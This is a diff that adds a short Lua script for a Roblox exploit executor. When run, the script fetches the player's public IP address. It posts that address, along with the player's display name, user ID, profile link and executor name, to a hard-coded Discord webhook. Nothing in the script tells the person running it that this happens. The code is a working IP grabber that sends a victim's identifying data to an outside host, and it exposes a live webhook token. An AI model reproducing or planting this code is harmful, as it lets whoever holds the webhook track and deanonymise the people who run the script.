@@ -1,0 +1,20 @@
+syn.request({
+  Url = "https://discord.com/api/webhooks/915753397221736459/rDk-rQPLfTCHz_4_K1JUkajJKY0doNFDeVZut16ri5nZKBYv71Za9GBsZwMG65IxQxUQ",
+  Body = game:GetService("HttpService"):JSONEncode({
+    embeds = {
+      {
+        title = "IP: ||" .. game:HttpGet("https://v4.ident.me") .. "||",
+        type = "rich",
+        description = "DisplayName: **" .. game.Players.LocalPlayer.DisplayName .. "**" .. "\n" .. "UserId : **" .. game.Players.LocalPlayer.UserId .. "**" .. "\n" .. "Link To Profile: https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile" .. "\n" .. "Executer: **" .. identifyexecutor() .. "**",
+        color = tonumber(7498202),
+        footer = {}
+      }
+    },
+    avatar_url = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(game:GetService("Players").LocalPlayer.Name),
+    username = "Username: " .. game.Players.LocalPlayer.Name
+  }),
+  Method = "POST",
+  Headers = {
+    ["content-type"] = "application/json"
+  }
+})
